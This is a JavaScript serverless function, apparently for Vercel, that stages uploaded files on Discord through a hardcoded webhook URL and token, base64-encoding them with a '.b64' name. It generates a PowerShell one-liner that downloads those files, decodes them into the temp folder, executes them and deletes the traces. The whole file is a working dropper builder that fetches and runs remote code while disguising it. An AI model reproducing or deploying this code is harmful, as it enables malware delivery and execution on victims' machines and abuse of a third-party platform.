const https = require('https');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

// ВАЖНО: Отключаем bodyParser
module.exports.config = {
  api: {
    bodyParser: false,
  },
};

function parseMultipart(data, boundary) {
  const parts = [];
  const boundaryBuffer = Buffer.from('--' + boundary);
  let start = 0;

  while (true) {
    start = data.indexOf(boundaryBuffer, start);
    if (start === -1) break;
    start += boundaryBuffer.length;

    let end = data.indexOf(boundaryBuffer, start);
    if (end === -1) break;

    const part = data.slice(start, end);
    const headerEnd = part.indexOf('\r\n\r\n');
    if (headerEnd !== -1) {
      const headers = part.slice(0, headerEnd).toString();
      const content = part.slice(headerEnd + 4, part.length - 2); // -2 to remove \r\n
      
      const nameMatch = headers.match(/name="([^"]+)"/);
      const filenameMatch = headers.match(/filename="([^"]+)"/);
      
      if (nameMatch && nameMatch[1] === 'fileToUpload') {
        parts.push({
          filename: filenameMatch ? filenameMatch[1] : 'file',
          content: content
        });
      }
    }
    start = end;
  }
  return parts;
}

async function uploadToDiscord(content, filename) {
  const base64 = content.toString('base64');
  const encodedName = filename.replace(/\.[^/.]+$/, '') + '.b64';
  const boundary = '----Boundary' + Math.random().toString(36).substring(2);
  
  const payload = Buffer.concat([
    Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedName}"\r\nContent-Type: text/plain\r\n\r\n`),
    Buffer.from(base64),
    Buffer.from(`\r\n--${boundary}--\r\n`)
  ]);

  return new Promise((resolve, reject) => {
    const url = new URL(DISCORD_WEBHOOK);
    const req = https.request({
      hostname: url.hostname,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': payload.length
      }
    }, res => {
      let resData = '';
      res.on('data', chunk => resData += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(resData);
          if (json.attachments?.[0]?.url) resolve({ url: json.attachments[0].url, name: filename });
          else reject(new Error('Discord API error: ' + resData));
        } catch (e) { reject(new Error('Invalid Discord JSON: ' + resData)); }
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Use POST' });

  try {
    const contentType = req.headers['content-type'] || '';
    const boundary = contentType.split('boundary=')[1];
    if (!boundary) throw new Error('No boundary');

    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const buffer = Buffer.concat(chunks);
    
    if (buffer.length > 4.5 * 1024 * 1024) throw new Error('File too large for Vercel (max 4.5MB)');

    const files = parseMultipart(buffer, boundary);
    if (files.length === 0) throw new Error('No files in request');

    const results = [];
    for (const f of files) {
      const uploaded = await uploadToDiscord(f.content, f.filename);
      results.push(uploaded);
    }

    let cmd = '';
    if (results.length === 1) {
      cmd = `powershell -c "$t=\\"$env:TEMP\\${results[0].name}\\";$u='${results[0].url}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
    } else {
      let varDefs = [], cmdParts = [], startParts = [], tVars = [];
      results.forEach((r, i) => {
        const idx = i + 1;
        varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.name}\\"`, `$u${idx}='${r.url}'`);
        cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
        startParts.push(`Start-Process $t${idx} -Wait`);
        tVars.push(`$t${idx}`);
      });
      cmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
    }

    // Отправляем в Discord
    const webhookReq = https.request(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
    webhookReq.write(JSON.stringify({ content: `📁 **${results.map(r=>r.name).join(', ')}**\n\`\`\`powershell\n${cmd}\n\`\`\`` }));
    webhookReq.end();

    return res.status(200).json({ success: true, command: cmd });
  } catch (e) {
    return res.status(500).json({ success: false, error: e.message });
  }
};
